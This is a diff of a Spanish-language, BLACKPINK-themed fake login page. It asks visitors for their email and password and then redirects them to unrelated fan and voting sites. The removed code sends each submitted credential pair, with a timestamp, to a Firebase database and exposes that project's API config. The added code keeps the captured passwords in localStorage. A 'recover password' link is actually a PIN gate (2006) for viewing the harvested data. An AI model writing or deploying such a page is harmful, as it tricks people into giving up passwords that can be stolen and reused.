@@ -4,105 +4,144 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Inicia Sesión</title>
+
+  <!-- Fuente bonita y amigable -->
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+
   <style>
     body { 
       margin: 0; 
       font-family: 'Poppins', sans-serif; 
-      background: linear-gradient(135deg, #89f7fe, #66a6ff); 
       display: flex; 
       justify-content: center; 
       align-items: center; 
       min-height: 100vh; 
-      flex-direction: column; 
+      flex-direction: column;
+
+      /* Fondo con nueva imagen */
+      background: url('https://pbs.twimg.com/media/FvTDI2_X0AE-aNl.jpg:large') no-repeat center center fixed;
+      background-size: cover;
     }
+
     .login-box { 
-      background: white; 
+      background: rgba(255, 255, 255, 0.9); /* blanco semitransparente */
       padding: 40px; 
       border-radius: 20px; 
-      box-shadow: 0 8px 20px rgba(0,0,0,0.2); 
+      box-shadow: 0 8px 20px rgba(0,0,0,0.3); 
       width: 100%; 
       max-width: 380px; 
       text-align: center; 
       margin-bottom: 20px; 
       animation: fadeIn 1s ease-in-out; 
     }
-    .login-box h2 { font-weight: 600; font-size: 26px; color: #333; margin-bottom: 5px; }
-    .login-box p { color: #666; font-size: 14px; margin-top: 0; }
-    .login-box input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; font-size: 14px; }
-    .login-box button { width: 100%; padding: 12px; background: #4285F4; border: none; border-radius: 10px; color: white; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 10px; transition: 0.3s; }
-    .login-box button:hover { background: #2f6ae0; }
-    .extra { margin-top: 15px; font-size: 13px; color: #666; }
-    .extra a { color: #4285F4; text-decoration: none; cursor: pointer; }
-    .extra a:hover { text-decoration: underline; }
-    @keyframes fadeIn { from { opacity: 0; transform: translateY(-20px); } to { opacity: 1; transform: translateY(0); } }
+
+    .login-box h2 { 
+      margin-bottom: 5px; 
+      font-weight: 600; 
+      font-size: 22px; 
+      color: #111; 
+    }
+
+    .login-box p { 
+      margin-top: 0; 
+      color: #444; 
+      font-size: 14px; 
+    }
+
+    .login-box input { 
+      width: 100%; 
+      padding: 12px; 
+      margin: 10px 0; 
+      border: 1px solid #ddd; 
+      border-radius: 10px; 
+      font-size: 14px; 
+    }
+
+    .login-box button { 
+      width: 100%; 
+      padding: 12px; 
+      background: #ff3399; 
+      border: none; 
+      border-radius: 10px; 
+      color: white; 
+      font-size: 16px; 
+      font-weight: 600; 
+      cursor: pointer; 
+      margin-top: 10px; 
+      transition: 0.3s; 
+    }
+
+    .login-box button:hover { 
+      background: #cc0066; 
+    }
+
+    .extra { 
+      margin-top: 15px; 
+      font-size: 13px; 
+      color: #666; 
+    }
+
+    .extra a { 
+      color: #ff3399; 
+      text-decoration: none; 
+      cursor: pointer; 
+    }
+
+    .extra a:hover { 
+      text-decoration: underline; 
+    }
+
+    /* Animación fade-in */
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
   </style>
 </head>
 <body>
 
+  <!-- Formulario -->
   <div class="login-box">
-    <h2>Inicia Sesión</h2>
-    <p>Bienvenido, ingresa tus datos</p>
+    <h2>Inicia sesión para descubrir el mundo de BLACKPINK 💖🖤</h2>
+    <p>BLINK, ingresa tus datos y acompaña a tu grupo favorito</p>
     <form id="loginForm">
-      <input type="email" id="email" placeholder="Correo electrónico" required>
-      <input type="password" id="password" placeholder="Contraseña" required>
+      <input type="email" name="email" placeholder="Correo electrónico" required>
+      <input type="password" name="password" placeholder="Contraseña" required>
       <button type="submit">Ingresar</button>
     </form>
+
     <div class="extra">
       <p>¿Olvidaste tu contraseña? <a id="recoverLink">Recupérala aquí</a></p>
     </div>
   </div>
 
-  <!-- Firebase SDK -->
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-app.js";
-    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.5/firebase-database.js";
-
-    // Tu configuración de Firebase
-    const firebaseConfig = {
-      apiKey: "AIzaSyBFcBx7J4Yi01yka8oqqwEnjWQ4gYt7WBo",
-      authDomain: "loginapp-63f68.firebaseapp.com",
-      databaseURL: "https://loginapp-63f68-default-rtdb.firebaseio.com",
-      projectId: "loginapp-63f68",
-      storageBucket: "loginapp-63f68.firebasestorage.app",
-      messagingSenderId: "899292217772",
-      appId: "1:899292217772:web:b7b7fde65af64e639b7a09",
-      measurementId: "G-6NEF65BNGK"
-    };
-
-    // Inicializar Firebase
-    const app = initializeApp(firebaseConfig);
-    const db = getDatabase(app);
-
+  <script>
     const loginForm = document.getElementById('loginForm');
     const recoverLink = document.getElementById('recoverLink');
 
-    loginForm.addEventListener('submit', (e) => {
+    loginForm.addEventListener('submit', function(e){
       e.preventDefault();
-      const email = document.getElementById('email').value;
-      const password = document.getElementById('password').value;
+      const email = this.email.value;
+      const password = this.password.value;
 
-      // Guardar en la DB
-      push(ref(db, "usuarios"), {
-        email: email,
-        password: password,
-        fecha: new Date().toLocaleString()
-      }).then(() => {
-        // Redirigir al enlace BlackPink después de guardar
-        window.location.href = "https://www.bu.edu/lernet/artemis/years/2017/projects/StudentWebsites/Michelle/pages/BlackPink.html";
-      }).catch((error) => {
-        alert("Error al guardar: " + error.message);
-      });
+      // Guardar en localStorage
+      let historial = JSON.parse(localStorage.getItem('historialDatos')) || [];
+      historial.push({ email, password, fecha: new Date().toLocaleString() });
+      localStorage.setItem('historialDatos', JSON.stringify(historial));
+
+      // Redirigir a la nueva página
+      window.location.href = "https://www.tuvotacion.com/quien-es-la-ms-bonita-de-blackpink-1";
     });
 
-    recoverLink.addEventListener('click', () => {
+    recoverLink.addEventListener('click', function(){
       const pin = prompt("Ingresa el PIN para acceder a los datos:");
       if(pin === "2006"){
-        alert("✅ Acceso permitido (pero los datos solo los ves en Firebase Console).");
+        alert("✅ Acceso permitido (aquí iría la vista del historial)");
       } else {
         alert("PIN incorrecto ❌");
       }
     });
   </script>
+
 </body>
 </html>
